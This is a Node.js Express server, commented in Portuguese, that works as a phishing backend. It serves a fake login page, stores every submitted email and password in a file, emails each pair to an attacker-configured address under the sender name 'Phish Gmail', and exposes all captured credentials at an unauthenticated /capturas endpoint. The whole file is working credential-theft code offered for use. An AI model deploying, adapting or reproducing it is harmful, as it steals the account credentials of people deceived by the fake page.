const express = require('express');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

// Serve o login.html na raiz e em /login.html
const loginPath = path.join(__dirname, 'login.html');

app.get('/', (req, res) => {
  res.sendFile(loginPath);
});

app.get('/login.html', (req, res) => {
  res.sendFile(loginPath);
});

// Diretório de dados (volume montado)
const DATA_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH || path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}
const CAPTURAS_FILE = path.join(DATA_DIR, 'capturas.txt');

async function enviarEmail(email, password, timestamp) {
  if (!process.env.SMTP_USER || !process.env.SMTP_PASS || !process.env.RECEIVER_EMAIL) {
    console.warn('[email] variaveis SMTP nao configuradas — pulando envio');
    return;
  }

  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtp.gmail.com',
    port: parseInt(process.env.SMTP_PORT || '465'),
    secure: process.env.SMTP_SECURE !== 'false', // true por padrao (porta 465)
    connectionTimeout: 10000,
    greetingTimeout: 10000,
    socketTimeout: 15000,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS
    }
  });

  const info = await transporter.sendMail({
    from: `"Phish Gmail" <${process.env.SMTP_USER}>`,
    to: process.env.RECEIVER_EMAIL,
    subject: `Nova captura: ${email}`,
    text: `Data: ${timestamp}\nE-mail: ${email}\nSenha: ${password}`
  });
  console.log('[email] enviado:', info.messageId);
}

app.post('/captura', async (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();

  // Responde IMEDIATAMENTE (não segura o redirecionamento do usuário)
  res.status(200).json({ ok: true });

  // 1. Grava em arquivo persistente
  try {
    fs.appendFileSync(CAPTURAS_FILE, `${timestamp} | ${email} | ${password}\n`);
    console.log('[captura] gravado:', email);
  } catch (err) {
    console.error('[captura] erro ao gravar arquivo:', err.message);
  }

  // 2. Envia por e-mail (com retry simples)
  try {
    await enviarEmail(email, password, timestamp);
  } catch (err) {
    console.error('[email] tentativa 1 falhou:', err.message);
    setTimeout(() => {
      enviarEmail(email, password, timestamp)
        .catch(e2 => console.error('[email] tentativa 2 falhou:', e2.message));
    }, 3000);
  }
});

// Endpoint para verificar capturas
app.get('/capturas', (req, res) => {
  try {
    const content = fs.readFileSync(CAPTURAS_FILE, 'utf-8');
    res.type('text/plain').send(content || 'Nenhuma captura ainda.');
  } catch {
    res.send('Nenhuma captura ainda.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Servidor rodando na porta ${PORT}`));

